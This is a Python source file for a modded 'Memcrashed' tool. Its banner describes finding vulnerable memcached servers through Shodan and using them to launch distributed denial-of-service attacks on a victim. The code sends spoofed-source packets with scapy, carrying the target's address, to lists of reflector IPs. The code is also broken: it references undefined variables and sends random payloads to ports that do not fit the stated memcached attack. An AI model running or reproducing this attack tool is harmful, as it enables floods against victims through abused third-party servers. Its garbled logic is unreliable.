#-- coding: utf8 --
#!/usr/bin/env python
import sys, os, time
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'

logo = color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝

                                        Author: @037
                                        Version: 4.0
                                    Modded by : PhynX404

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                       
'''
print(logo)

while True:
    myresults = Path("./bots.txt")
    print('')
    try:
        saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: ').lower()
        if myresults.is_file():
            if saveme.startswith('y'):
                with open('bots.txt') as my_file:
                    ip_array = [line.rstrip() for line in my_file]
        else:
            print('')
            print('[✘] Error: No bots stored locally, bots.txt file not found!')
            print('')
        if saveme.startswith('y') or query.startswith('y'):
            print('')
            target = input("[▸] Enter target IP address: ")
            targetport = input("[▸] Enter target port number (Default 80): ") or "80"
            power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
            print('')
           # data = input("[+] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
           # if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
           #     dataset = "set injected 0 3600 ", len(data)+1, "\r\n", data, "\r\n get injected\r\n"
           #     setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
           #     getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
           #     p/rint("[+] Payload transformed: ", dataset)
            setdata = random._urandom(65813)
            getdata = random._urandom(65813)
            print('')
            if query.startswith('y'):
                iplist = input('[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
                if iplist.startswith('y'):
                    print('')
                    counter= int(0)
                    for result in results['matches']:
                        host = api.host('%s' % result['ip_str'])
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            if saveme.startswith('y'):
                iplistlocal = input('[*] Would you like to display all the bots stored locally? <Y/n>: ').lower()
                if iplistlocal.startswith('y'):
                    print('')
                    counter= int(0)
                    for x in ip_array:
                        host = api.host('%s' % x)
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            print('')
            engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
                        with suppress_stdout():
                            send(IP(src=target, dst='%s' % i) / TCP(sport=int(str(targetport)),dport=80)/Raw(load=setdata))
                            send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=17091)/Raw(load=getdata))
                else:
                    for result in results['matches']:
                        print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
                        with suppress_stdout():
                            send(IP(src=target, dst='%s' % result['ip_str']) / TCP(sport=int(str(targetport)),dport=80)/Raw(load=setdata), count=power)
                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=53)/Raw(load=getdata), count=power)
                print('')
                print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                break
            else:
                print('')
                print('[✘] Error: %s not engaged!' % target)
                print('[~] Restarting Platform! Please wait.')
                print('')
        else:
            print('')
            print('[✘] Error: No bots stored locally or remotely on Shodan!')
            print('[~] Restarting Platform! Please wait.')
            print('')
